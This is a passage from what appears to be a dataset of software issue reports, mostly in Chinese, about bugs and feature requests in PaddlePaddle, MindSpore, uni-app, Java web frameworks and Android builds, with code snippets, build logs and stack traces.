org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136) at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.base/java.lang.Thread.run(Thread.java:833)   <code>: Map&lt;String, List&lt;KeyValue&gt;&gt; all = gaeaDictService.all(language); return responseSuccessWithData(all); } ... }"
Tensor concat方法建议,"希望paddle也能支持空tensor的concat操作   <code>: log = torch.FloatTensor() torch.cat((log, torch.zeros(1, 3))) A = paddle.to_tensor([]) paddle.concat([A, paddle.zeros([1, 3])])"
动态shape,"原流程 需要在产生CustomCNode的时候将函数对象保存在里，infer、init、launch、update四种actor都需要开发   <code>: class CustomCNode : public CNode { public: CNodePtr origin_cnode_; CNodePtr origin_atomic_clean_cnode_; std::vector&lt;AnfNodePtr&gt; inputs_ = {0: {prim::kInfer, prim::kInit, prim::kLaunch, prim::kUpdateShape}, 1: in1, 2: in2, ... }; // one of these std::vector&lt;AnfNodeWeakPtr&gt; outputs_ = {}; // outputs need be recorded std::function&lt;void(OpContext&lt;DeviceTensor&gt; *const context, void *args)&gt; actor_func_; // custom actor callback private: ... } prim::kShape origin_cnode_ CustomCNode::outputs_ CustomCNode::actor_func_"
Docker build fails,"Need Go binary installed into dev image. in PR: https://github.com/PaddlePaddle/Paddle/pull/2236 After installing Go inside dev image, fails:   <code>: paddle/api/CMakeLists.txt docker run -it -v $PWD:/paddle -e ""WITH_GPU=OFF"" -e ""WITH_AVX=OFF"" dev + '[' OFF == ON ']' + BASE_IMAGE=ubuntu:16.04 + DOCKERFILE_GPU_ENV= + DOCKERFILE_CUDNN_DSO= + [[ OFF == \O\N ]] + mkdir -p /paddle/build + cd /paddle/build + rm '*.deb' + true + cat ======================================== Configuring cmake in /paddle/build ... -DCMAKE_BUILD_TYPE=Release -DWITH_DOC=OFF -DWITH_GPU=OFF -DWITH_AVX=OFF -DWITH_SWIG_PY=ON -DCUDNN_ROOT=/usr/ -DWITH_STYLE_CHECK=OFF -DWITH_TESTING=OFF -DCMAKE_EXPORT_COMPILE_COMMANDS=ON ======================================== + cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_DOC=OFF -DWITH_GPU=OFF -DWITH_AVX=OFF -DWITH_SWIG_PY=ON -DCUDNN_ROOT=/usr/ -DWITH_STYLE_CHECK=OFF -DWITH_TESTING=OFF -DCMAKE_EXPORT_COMPILE_COMMANDS=ON -- Found Paddle host system: ubuntu -- Found Paddle host system's CPU: 8 cores -- Found Git: /usr/bin/git (found version ""2.7.4"") -- Found Protobuf: /paddle/third_party/install/protobuf/lib/libprotobuf.a (Required is at least version ""3.1"") -- Protobuf protoc executable: /paddle/third_party/install/protobuf/bin/protoc -- Protobuf library: /paddle/third_party/install/protobuf/lib/libprotobuf.a -- Found PythonInterp: /usr/bin/python2.7 (found suitable version ""2.7.12"", minimum required is ""2.7"") -- Found PythonLibs: /usr/lib/x86_64-linux-gnu/libpython2.7.so (found suitable version ""2.7.12"", minimum required is ""2.7"") -- BLAS library: /paddle/third_party/install/openblas/lib/libopenblas.a -- Command ""/usr/bin/swig2.0 -swiglib"" failed with output: -- Paddle version is 0.10.0 CMake Error at paddle/api/CMakeLists.txt:21 (INCLUDE): include called with wrong number of arguments. include() only takes one file. CMake Error at paddle/api/CMakeLists.txt:55 (SWIG_ADD_MODULE): Unknown CMake command ""SWIG_ADD_MODULE"". -- Configuring incomplete, errors occurred! See also ""/paddle/build/CMakeFiles/CMakeOutput.log"". See also ""/paddle/build/CMakeFiles/CMakeError.log""."
Rename seq to sequence in sequence_expand_op,Rename files name and variable name from to in sequence_expand_op.   <code>: seq sequence
代码生成 表明有个别名,"比如   <code>: select t.name,t.age from user t"
Select组件不滑动选项时没有extra属性,"问题：select组件 list属性的extra无效 复现方式：当唤起select组件之后，动态设置list时，在不滑动选项的情况下直接点击确认时，没有extra属性   <code>: &lt;template&gt; &lt;view&gt; &lt;u-select v-model=""visible"" :list=""list"" safe-area-inset-bottom @confirm=""onConfirm""&gt;&lt;/u-select&gt; &lt;/view&gt; &lt;/template&gt; &lt;script&gt; export default { data() { return { visible: true, list: [] } }, onLoad() { this.getInit() }, methods: { onConfirm(value) { // 此时的extra为Undefined console.log(value[0].extra) }, getInit() { setTimeout(() =&gt; { this.list = [ { label: '周一', value: 1, extra: 0 }, { label: '周二', value: 2, extra: 1 } ] }, 1000) } } } &lt;/script&gt;"
There are large amount of wget logs when download flowers dataset.,"We may use .   <code>: wget -q [04:31:26]W: [Step 1/1] + cat [04:31:26]W: [Step 1/1] + [[ OFF == \O\N ]] [04:31:26]W: [Step 1/1] + cat [04:31:33]W: [Step 1/1] + wget http://paddlemodels.cdn.bcebos.com/flowers/102flowers.tgz -O 102flowers.tgz [04:31:33]W: [Step 1/1] --2018-08-27 12:31:33-- http://paddlemodels.cdn.bcebos.com/flowers/102flowers.tgz [04:31:33]W: [Step 1/1] Connecting to 172.19.57.45:8888... connected. [04:31:35]W: [Step 1/1] Proxy request sent, awaiting response... 200 OK [04:31:35]W: [Step 1/1] Length: 344862509 (329M) [application/gzip] [04:31:35]W: [Step 1/1] Saving to: “102flowers.tgz” [04:31:35]W: [Step 1/1] [04:31:35]W: [Step 1/1] 0K .......... .......... .......... .......... .......... 0% 147K 38m13s [04:31:35]W: [Step 1/1] 50K .......... .......... .......... .......... .......... 0% 307K 28m16s [04:31:35]W: [Step 1/1] 100K .......... .......... .......... .......... .......... 0% 1.92M 19m47s [04:31:35]W: [Step 1/1] 150K .......... .......... .......... .......... .......... 0% 438K 18m2s [04:31:35]W: [Step 1/1] 200K .......... .......... .......... .......... .......... 0% 530K 16m33s [04:31:35]W: [Step 1/1] 250K .......... .......... .......... .......... .......... 0% 384K 16m13s [04:31:35]W: [Step 1/1] 300K .......... .......... .......... .......... .......... 0% 829K 14m52s [04:31:36]W: [Step 1/1] 350K .......... .......... .......... .......... .......... 0% 403K 14m45s [04:31:36]W: [Step 1/1] 400K .......... .......... .......... .......... .......... 0% 1.03M 13m41s [04:31:36]W: [Step 1/1] 450K .......... .......... .......... .......... .......... 0% 435K 13m36s [04:31:36]W: [Step 1/1] 500K .......... .......... .......... .......... .......... 0% 1.00M 12m52s [04:31:36]W: [Step 1/1] 550K .......... .......... .......... .......... .......... 0% 482K 12m46s"
[ST][MS/modelzoo][NET][AC][GPU] acc  is smaller than standard,精度劣化 rewards ：9.4 远小于标准rewards150 / 硬件环境: /device GPU/ : -- MindSpore version :master commit_id:3232a15b -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_ac_train_infer_gpu_0001 get code from models sh run_standalone_train.sh rewards达到150的标准 走给施梁   <code>: Evaluate for episode 950 total rewards is 9.600 Evaluate for episode 960 total rewards is 9.500 Evaluate for episode 970 total rewards is 9.100 Evaluate for episode 980 total rewards is 9.600 Evaluate for episode 990 total rewards is 9.400
refine mkldnn benchmark script,Avoid cpu conflicting when   <code>: use_mkldnn=False
分页  countSql 优化 left join 问题,"当前使用版本 3.5.1 使用自定义 sql 分页当存在 left join 连接时，由于 where 是根据业务动态的，在执行 select count 应该是后判断的 where 导致判断为未使用 left join 就被优化掉了   <code>: SELECT A.id, A.name, B.id , B.name, C.id, C.name FROM A LEFT JOIN B ts ON A.id = B.id AND B.deleted = 0 LEFT JOIN C tw ON A.id = C.id AND C.deleted = 0 WHERE A.deleted = 0 AND C.name LIKE CONCAT('%', 'CS', '%') ### SQL: select count(*) as total from A where A.deleted = 0 and C.name = 'cs' ### Cause: java.sql.SQLSyntaxErrorException: Unknown column 'C.name' in 'where clause' ; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: Unknown column 'c.name' in 'where clause'"
模型训练内存占用较高,"1）PaddlePaddle版本：1.5.0 2）CPU： 3）GPU：tesla v100 训练信息 1）单机 单卡 2）显存信息 模型为双塔模型 左侧 resnet 50 右侧 BOW 顶部 两层FC 目前的情况是训练过程中内存占用率较高，大概占用84G内存 模型在训练过程中使用了io.PyReader, 显存策略如下   <code>: places = fluid.cuda_places() place = fluid.CUDAPlace(0) exe = fluid.Executor(place) exec_strategy = fluid.ExecutionStrategy() exec_strategy.num_threads = fluid.core.get_cuda_device_count() exec_strategy.num_iteration_per_drop_scope = 100 build_strategy = fluid.BuildStrategy() build_strategy.enable_inplace = True train_exe = fluid.ParallelExecutor( use_cuda=True, main_program=fluid.default_main_program(), loss_name=loss.name, build_strategy=build_strategy, exec_strategy=exec_strategy) train_reader = fluid.io.PyReader( feed_list=feed_list, capacity=5, use_double_buffer=True, iterable=True) train_reader.decorate_batch_generator(train_batch_gen, places=places) # train_batch_gen 为多进程数据读取 ，使用了linecache export CUDA_VISIBLE_DEVICES=4 export FLAGS_sync_nccl_allreduce=1 export FLAGS_fraction_of_gpu_memory_to_use=0 export FLAGS_eager_delete_tensor_gb=0.0 export FLAGS_fast_eager_deletion_mode=1 python XXX.py"
[CT][MS]动态shape索引 取值get   CPU反向求导时 和标杆不一致,"get cpu反向求导有错误 test_parser_dynamic_input_index_slice test_parser_dynamic_input_index_slice test_parser_dynamic_input_index_slice_001 test_parser_dynamic_input_index_slice_002 test_parser_dynamic_input_index_slice_005 test_parser_dynamic_input_index_slice_008 test_parser_dynamic_input_index_slice_009 test_parser_dynamic_input_index_slice_010 test_parser_dynamic_input_index_int_001 test_parser_dynamic_input_index_int_002 test_parser_dynamic_input_index_int_003 test_parser_dynamic_input_index_int_004 test_parser_dynamic_input_index_tuple_1002 test_parser_dynamic_input_mul_index_int_001 test_parser_dynamic_input_mul_index_int_002 / 硬件环境: /device CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行用例 passed   <code>: 用例1 def test_parser_dynamic_input_index_tuple_1002(): class Net(nn.Cell): def __init__(self): super().__init__() def construct(self, x): index = (2, slice(0, 4), None, 0) x = x[index] return x class TorchNet(nn_torch.Module): def __init__(self): super().__init__() def forward(self, x): index = (2, slice(0, 4), None, 0) x = x[index] return x net_ms = Net() dynamic_input = Tensor(shape=(3, 4, None, 2), dtype=mstype.float32) net_ms.set_inputs(dynamic_input) net_pt = TorchNet() input_np = np.random.randn(3, 4, 5, 2).astype(np.float32) fact = ParserFactory(net_ms, net_pt, input_np) fact.forward_cmp() fact.backward_cmp() 用例2 def test_parser_dynamic_input_mul_index_int_002(): class Net(nn.Cell): def __init__(self): super().__init__() def construct(self, x): x = x[2][2] return x class TorchNet(nn_torch.Module): def __init__(self): super().__init__() def forward(self, x): x = x[2][2] return x net_ms = Net() dynamic_input = Tensor(shape=(4, None, 3), dtype=mstype.float32) net_ms.set_inputs(dynamic_input) net_pt = TorchNet() input_np = np.random.randn(4, 4, 3).astype(np.float32) fact = ParserFactory(net_ms, net_pt, input_np) fact.forward_cmp() fact.backward_cmp() 用例1 data_expected = array([[[[ 0. , 0. ], [ 0. , 0. ], [ 0. , 0. ], ...[ 0. , 0. ], [ 0. , 0. ], [ 0. , 0. ]]]], dtype=float32) data_me = array([[[[0. , 0. ], [0. , 0. ], [0. , 0. ], [0. ... [0. , 0. ], [0. , 0. ], [0. , 0. ]]]], dtype=float32) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 0. 0. 0. 0. 0.19918552 0.5950266 E 0.9380358 0.09371382 -0.04822045 -0.997068 -0.19823541 -0.20401184] E data_me_error:[0.19918552 0.5950266 0.9380358 0.09371382 0. 0. E 0. 0. 0. 0. 0. 0. ] E loss:[0.19918552 0.5950266 0.9380358 0.09371382 0.19918552 0.5950266 E 0.9380358 0.09371382 0.04822045 0.997068 0.19823541 0.20401184] ../share/utils.py:24: AssertionError 用例2 data_expected = array([[[ 0. , 0. , 0. ], [ 0. , 0. , 0. ], [ 0. ... ], [ 0. , 0. , 0. ], [ 0. , 0. , 0. ]]], dtype=float32) data_me = array([[[0., 0., 0.], [0., 0., 0.], [0., 0., 0.], [0., 0., 0.]], [[0., 0., 0.], ...0., 0., 0.]], [[0., 0., 0.], [0., 0., 0.], [0., 0., 0.], [0., 0., 0.]]], dtype=float32) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-1.1729764 0.63034576 -2.2338922 ] E data_me_error:[0. 0. 0.] E loss:[1.1729764 0.63034576 2.2338922 ] ../share/utils.py:24: AssertionError"
win7上允许客户端报错,"我看了下具体原因,是因为 netstandard2.0 需要 Framework 4.6 的支持, 但是呢 win7不支持FW4.6 如果降级为 4.5或者4.0, netstandard又会提示不支持4.5 我该怎么去妥协呢   <code>: Log:Method not found: '!!0[] System.Array.Empty()'. at SiMay.ServiceCore.Helper.SystemInfoHelper.get_GetOSFullName() at SiMay.ServiceCore.MainService.MainService.SendLoginPack(TcpSocketSaeaSession session) at SiMay.Core.PacketModelBinding.PacketModelBinder`2.InvokePacketHandler(TSession session, TMessageHead head, Object source) in \SiMayRemoteMonitorOS\SiMay.Core\PacketModelBinder\PacketModelBinder.cs:line 30 at SiMay.ServiceCore.MainService.MainService.Notify(TcpSessionNotify notify, TcpSocketSaeaSession session)"
Add comment in ops.rst about functional,"Task Use this template for task tracking kind/task Task Description Add descriptions to some functions in the documentation. The file: https://gitee.com/mindspore/docs/blob/8e1e41bbfc8d87fd65615c1b685b9f9dd3897869/docs/api_python/source_en/mindspore/mindspore.ops.rst The functions need to add descriptions: For details on how to modify, please refer to this PR: https://gitee.com/mindspore/docs/pulls/4079/files Task Goal Update documentation for .   <code>: mindspore.ops.rst in_dict is_not is_ is_constant not_in_dict mixed_precision_cast scalar_add scalar_div scalar_floordiv scalar_log scalar_mod scalar_mul scalar_pow scalar_sub scalar_uadd scalar_usub ops.functional"
爬虫返回这个是什么意思？,返回结果： 爬虫返回这个是什么意思？是网站屏蔽爬虫了吗？   <code>: System.out.println(page.getHtml()); &lt;html&gt; &lt;head&gt; &lt;script&gt;window.location.href='http://www.xxx.com/qlist/?cid=6';&lt;/script&gt; &lt;/head&gt; &lt;body&gt;&lt;/body&gt; &lt;/html&gt;
【2.0RC】F.grid_sample在特定条件下造成有cuda异常错误,"1）PaddlePaddle版本：2.0.0rc 2）CPU：aistudio-gpu 3）GPU：aistudio-gpu 4）系统环境：aistudio 现象： 错误仅在在gpu动态图下发生，cpu时未发生错误： 在特定条件下执行后，函数可以正常执行，但之后对任何变量进行astype()操作均会报错(可能运行其他op也会出错)。 经检查后发现，gpu下只要这段代码中的use_cudnn=False，则会出现错误。 具体来说，只有才不会报错。 错误发生时内存和显存占用极低，令人疑惑。 https://github.com/PaddlePaddle/Paddle/blob/530deb144e25be52adc16999cdcab67cfe39f092/python/paddle/nn/functional/vision.py#L305-L328 aistudio上复现 报错提示：   <code>: F.grid_sample F.grid_sample(..., align_corners=True, mode='bilinear', padding_mode='zeros') import paddle paddle.set_device(""gpu"") a = paddle.rand((10, 3, 256, 256)) b = paddle.rand((10, 256, 256, 2)) c = paddle.rand((2, 2)) print(c.astype('float32')) d = paddle.nn.functional.grid_sample(a, b, mode='bilinear', padding_mode='zeros', align_corners=True) print(c.astype('float32')) # 此时可正常输出 # 若此时进入函数，在320行前令use_cudnn=True，则无报错 d = paddle.nn.functional.grid_sample(a, b, mode='bilinear', padding_mode='reflection', align_corners=True) print(c.astype('float32')) # 此时报错 -------------------------------------- C++ Traceback (most recent call last): -------------------------------------- 0 paddle::imperative::Tracer::TraceOp(std::string const&amp;, paddle::imperative::NameVarBaseMap const&amp;, paddle::imperative::NameVarBaseMap const&amp;, paddle::framework::AttributeMap) 1 paddle::platform::EnforceNotMet::EnforceNotMet(paddle::platform::ErrorSummary const&amp;, char const*, int) 2 paddle::platform::GetCurrentTraceBackString[abi:cxx11]() ---------------------- Error Message Summary: ---------------------- FatalError: Operator cast raises an thrust::system::system_error exception. The exception content is :parallel_for failed: cudaErrorInvalidConfiguration: invalid configuration argument. (at /paddle/paddle/fluid/imperative/tracer.cc:89)"
"参数绑定param或json入参时，自动转换空字符串""""为null（解决方案）","造成查询list拼接上了空字符串查询，导致查询不出来。 解决方案： 1. 升级版本 1.10.11-M1 以上 2. 代码   <code>: 请求: POST /dict/list 参数： { parentId: '-1', dicDescription: '', dicCode: '', dicValue: '', } 期望： { ""dicCode"": null, ""dicDescription"": null, ""dicValue"": null, ""parentId"": ""-1"", ""id"": """" } 实际： { ""dicCode"": """", ""dicDescription"": """", ""dicValue"": """", ""parentId"": ""-1"", ""id"": """" } &lt;parent&gt; &lt;groupId&gt;org.noear&lt;/groupId&gt; &lt;artifactId&gt;solon-parent&lt;/artifactId&gt; &lt;version&gt;1.10.11-M1&lt;/version&gt; &lt;relativePath /&gt; &lt;/parent&gt; public static void main(String[] args) { Solon.start(DemoApp.class, args, app -&gt; { // 处理参数左右空白 app.before(ctx -&gt; { ctx.paramMap().forEach((k, v) -&gt; { if (StrUtil.isBlank(v)) { // 清除url上空字符串，转为null或移除 ctx.paramMap().remove(k); } else { ctx.paramMap().put(k, StrUtil.trim(v)); } }); }); // 处理json空字符串入参，设置为null app.onEvent(SnackActionExecutor.class, executor -&gt; { executor.config().addDecoder(String.class, (node, type) -&gt; { if (Utils.isEmpty(node.getString())) { return null; } else { // 处理参数左右空白 return StrUtil.trim(node.getString()); } }); }); }); }"
希望下拉树提交表单时能够将半选值一起提交,目前下拉树所在的表单提交时，只会将已选择的叶节点提交，必须手动使用方法才能得到半选节点，再使用setValue去修改表单值。 但有时，表单的操作是在其它页面，甚至是在iframe页面，不太好调用这些方法。建议添加选项，提交表单时，将半选节点的值一起提交。   <code>: getTreeValue
通过 async、await 语法调用 uni.getNetworkType()，返回结果与微信小程序里面调用不一致。,"举例 期望 uniapp调用后返回结果为一个数组，且第一个值为null，应该与微信小程序返回一致，直接返回一个对象，目标对象结构体为 。   <code>: // 使用uniapp调用 const a1 = async () =&gt; { const p1 = await uni.getNetworkType() console.log('[获取网络数据]', p1) } // 返回结果为 [null,{""errMsg"":""getNetworkType:ok"",""networkType"":""wifi""}] // 直接使用微信小程序调用 const a1 = async () =&gt; { const p1 = await wx.getNetworkType() console.log('[获取网络数据]', p1) } // 返回结果为 {""errMsg"":""getNetworkType:ok"",""networkType"":""wifi""} {""errMsg"":""getNetworkType:ok"",""networkType"":""wifi""}"
[MS/modelzoo][ST][NET][yolov5][GPU] fps is smaller than standard,"性能劣化 fps :220&lt; 250 问题commitid：c69cc34 ok_commit_id:a0c3e2cd / 硬件环境: /device GPU/ : -- MindSpore version :master commit_id:ad11cdb0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_crnn_seq_check_fps_8p get code from models sh run_train.sh 训练成功,性能达到250fps 备注 提给安正气   <code>: INFO test_ms_yolov5_gpu_check_loss_8p_0002m9L8WK4z:base.py:183 FPS: 220"
【论文复现】权重初始化,"方法如何通过paddle实现   <code>: w = torch.empty(3, 5) print(w) print(nn.init.constant_(w, 0.3)) tensor([[0.0000e+00, 0.0000e+00, 0.0000e+00, 0.0000e+00, 0.0000e+00], [0.0000e+00, 0.0000e+00, 0.0000e+00, 9.8091e-45, 0.0000e+00], [1.1210e-44, 0.0000e+00, 4.3048e-42, 0.0000e+00, 6.9571e-23]]) tensor([[0.3000, 0.3000, 0.3000, 0.3000, 0.3000], [0.3000, 0.3000, 0.3000, 0.3000, 0.3000], [0.3000, 0.3000, 0.3000, 0.3000, 0.3000]]) nn.init.constant_"
支付宝支付接口提示：缺少方法名参数,"IJPay 版本: 2.6.3 开发环境: java1.8 支付方式: 支付宝支付 调用的接口: transferQuery等多个接口 调用接口报以上错误，接口基本都会报错，只有appPay接口正常。 能够返回查询数据   <code>: &lt;div class=""ExclaimedInfo""&gt; &lt;strong&gt;调试错误，请回到请求来源地，重新发起请求。&lt;/strong&gt; &lt;div class=""Todo""&gt;错误代码 missing-method 错误原因: 缺少方法名参数 &lt;/div&gt; &lt;ul&gt; &lt;li&gt;说明:如果您不是因为本接口集成调试而看见该错误提醒，请联系本次请求来源网站，本错误属于网站集成接口的错误。&lt;/li&gt; @RequestMapping(value = ""/transferQuery"") @ResponseBody public String transferQuery(@RequestParam(required = false, name = ""outBizNo"") String outBizNo, @RequestParam(required = false, name = ""orderId"") String orderId) { AlipayFundTransOrderQueryModel model = new AlipayFundTransOrderQueryModel(); if (StringUtils.isNotEmpty(outBizNo)) { model.setOutBizNo(outBizNo); } if (StringUtils.isNotEmpty(orderId)) { model.setOrderId(orderId); } try { return AliPayApi.transferQueryToResponse(model).getBody(); } catch (Exception e) { e.printStackTrace(); } return null; }"
trainer_count，deviceId和threadId的关系,在doc/howto/usage/cmd_parameter/use_case_cn.md里面，有描述如何在不同设备上指定层： 原文如下： 当device!=-1时设备ID号的分配： 所以这里描述的，和分别该如何理解？ 它们如何对应到具体的GPU卡和CPU线程上？ 到底是数据并行还是模型并行还是两者都是？ 这个设计是出于什么目的？   <code>: (deviceId + gpu_id + threadId * numLogicalDevices_) % numDevices_ trainer_count deviceId threadId parallel_nn
fluid.metrics.EditDistance 可能存在的bug,"在下面函数中，avg_instance_error = self.instance_error / self.seq_num 除法两个变量都是整数，得到结果为0   <code>: def eval(self): if self.seq_num == 0: raise ValueError( ""There is no data in EditDistance Metric. Please check layers.edit_distance output has been added to EditDistance."" ) avg_distance = self.total_distance / self.seq_num avg_instance_error = self.instance_error / self.seq_num return avg_distance, avg_instance_error"
使用IStringLocalizerFactory生成IStringLocalizer后调用出错,"而这个方法并没有在派生类JsonStringLocalizerFactory 中重写，所以导致了用Create(string baseName, string location)这个方法创建的JsonStringLocalizer中的TypeName是null，就报错了 复现工程地址如下：https://gitee.com/tiansfather/boot-strap-blazor-test.git   <code>: 1.&lt;GetOrCreate&gt;b__0(ICacheEntry entry) 在 Microsoft.Extensions.Caching.Memory.CacheExtensions.GetOrCreate[TItem](IMemoryCache cache, Object key, Func"
"Manifest merger failed with multiple errors, see logs","任务描述 在AS4.0下面编译报这个错误。 请问咋解决？ Manifest merger failed with multiple errors, see logs 解决方案 任务来源   <code>: ~/Downloads/NativeAPP/android-app ? gradle processDebugmanifest --stacktrace 1 ? mac@192 &gt; Configure project :app WARNING: Configuration 'compile' is obsolete and has been replaced with 'implementation' and 'api'. It will be removed in version 5.0 of the Android Gradle plugin. For more information, see http://d.android.com/r/tools/update-dependency-configurations.html. WARNING: Configuration 'androidTestCompile' is obsolete and has been replaced with 'androidTestImplementation'. It will be removed in version 5.0 of the Android Gradle plugin. For more information, see http://d.android.com/r/tools/update-dependency-configurations.html. WARNING: Configuration 'testCompile' is obsolete and has been replaced with 'testImplementation'. It will be removed in version 5.0 of the Android Gradle plugin. For more information, see http://d.android.com/r/tools/update-dependency-configurations.html. WARNING: API 'variant.getMappingFile()' is obsolete and has been replaced with 'variant.getMappingFileProvider()'. It will be removed in version 5.0 of the Android Gradle plugin. For more information, see https://d.android.com/r/tools/task-configuration-avoidance. To determine what is calling variant.getMappingFile(), use -Pandroid.debug.obsoleteApi=true on the command line to display more information. WARNING: API 'variant.getAssemble()' is obsolete and has been replaced with 'variant.getAssembleProvider()'. It will be removed in version 5.0 of the Android Gradle plugin. For more information, see https://d.android.com/r/tools/task-configuration-avoidance. To determine what is calling variant.getAssemble(), use -Pandroid.debug.obsoleteApi=true on the command line to display more information. &gt; Configure project :open WARNING: Configuration 'compile' is obsolete and has been replaced with 'implementation' and 'api'. It will be removed in version 5.0 of the Android Gradle plugin. For more information, see http://d.android.com/r/tools/update-dependency-configurations.html. WARNING: Configuration 'androidTestCompile' is obsolete and has been replaced with 'androidTestImplementation'. It will be removed in version 5.0 of the Android Gradle plugin. For more information, see http://d.android.com/r/tools/update-dependency-configurations.html. WARNING: Configuration 'testCompile' is obsolete and has been replaced with 'testImplementation'. It will be removed in version 5.0 of the Android Gradle plugin. For more information, see http://d.android.com/r/tools/update-dependency-configurations.html. &gt; Task :open:processDebugManifest FAILED /Users/mac/Downloads/NativeAPP/android-app/open/src/main/AndroidManifest.xml:25:5-40:19 Error: tools:replace specified at line:25 for attribute tools:icon, but no new value specified /Users/mac/Downloads/NativeAPP/android-app/open/src/main/AndroidManifest.xml:25:5-40:19 Error: tools:replace specified at line:25 for attribute tools:theme, but no new value specified /Users/mac/Downloads/NativeAPP/android-app/open/src/main/AndroidManifest.xml Error: Validation failed, exiting See http://g.co/androidstudio/manifest-merger for more information about the manifest merger. FAILURE: Build failed with an exception. * What went wrong: Execution failed for task ':open:processDebugManifest'. &gt; A failure occurred while executing com.android.build.gradle.internal.tasks.Workers$ActionFacade &gt; Manifest merger failed with multiple errors, see logs * Try: Run with --info or --debug option to get more log output. Run with --scan to get full insights. * Exception is: org.gradle.api.tasks.TaskExecutionException: Execution failed for task ':open:processDebugManifest'. at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.lambda$executeIfValid$1(ExecuteActionsTaskExecuter.java:207) at org.gradle.internal.Try$Failure.ifSuccessfulOrElse(Try.java:263) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeIfValid(ExecuteActionsTaskExecuter.java:205) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.execute(ExecuteActionsTaskExecuter.java:186) at org.gradle.api.internal.tasks.execution.CleanupStaleOutputsExecuter.execute(CleanupStaleOutputsExecuter.java:114) at org.gradle.api.internal.tasks.execution.FinalizePropertiesTaskExecuter.execute(FinalizePropertiesTaskExecuter.java:46) at org.gradle.api.internal.tasks.execution.ResolveTaskExecutionModeExecuter.execute(ResolveTaskExecutionModeExecuter.java:62) at org.gradle.api.internal.tasks.execution.SkipTaskWithNoActionsExecuter.execute(SkipTaskWithNoActionsExecuter.java:57) at org.gradle.api.internal.tasks.execution.SkipOnlyIfTaskExecuter.execute(SkipOnlyIfTaskExecuter.java:56) at org.gradle.api.internal.tasks.execution.CatchExceptionTaskExecuter.execute(CatchExceptionTaskExecuter.java:36) at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.executeTask(EventFiringTaskExecuter.java:77) at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:55) at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:52) at org.gradle.internal.operations.DefaultBuildOperationExecutor$CallableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:409) at org.gradle.internal.operations.DefaultBuildOperationExecutor$CallableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:399) at org.gradle.internal.operations.DefaultBuildOperationExecutor$1.execute(DefaultBuildOperationExecutor.java:157) at org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:242) at org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:150) at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:94) at org.gradle.internal.operations.DelegatingBuildOperationExecutor.call(DelegatingBuildOperationExecutor.java:36) at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter.execute(EventFiringTaskExecuter.java:52) at org.gradle.execution.plan.LocalTaskNodeExecutor.execute(LocalTaskNodeExecutor.java:41) at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:356) at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:343) at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:336) at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:322) at 